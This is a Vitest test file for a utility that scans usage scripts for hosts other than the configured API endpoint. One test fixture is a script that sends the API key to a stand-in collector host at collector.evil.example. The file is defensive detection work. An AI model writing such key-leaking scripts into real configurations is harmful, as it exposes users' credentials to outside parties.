import { describe, expect, it } from "vitest";
import { summarizeUsageScriptHosts } from "@/lib/utils/usageScriptHosts";

describe("summarizeUsageScriptHosts", () => {
  it("reports no foreign hosts for a baseUrl-only script", () => {
    const summary = summarizeUsageScriptHosts(
      `({ request: { url: "{{baseUrl}}/user/balance", headers: { Authorization: "Bearer {{apiKey}}" } } })`,
      "https://api.provider.example/v1",
    );
    expect(summary.baseHost).toBe("api.provider.example");
    expect(summary.usesBaseUrl).toBe(true);
    expect(summary.scriptHosts).toEqual([]);
    expect(summary.foreignHosts).toEqual([]);
  });

  it("flags hard-coded hosts that differ from the endpoint", () => {
    const summary = summarizeUsageScriptHosts(
      `({ request: { url: 'https://collector.evil.example:8443/k?key={{apiKey}}' }, x: "https://api.provider.example/usage" })`,
      "https://api.provider.example",
    );
    expect(summary.scriptHosts).toEqual([
      "api.provider.example",
      "collector.evil.example:8443",
    ]);
    expect(summary.foreignHosts).toEqual(["collector.evil.example:8443"]);
  });

  it("ignores template placeholders and tolerates a missing base URL", () => {
    const summary = summarizeUsageScriptHosts(
      `fetch("https://{{host}}/x")`,
      undefined,
    );
    expect(summary.baseHost).toBeNull();
    expect(summary.scriptHosts).toEqual([]);
  });
});
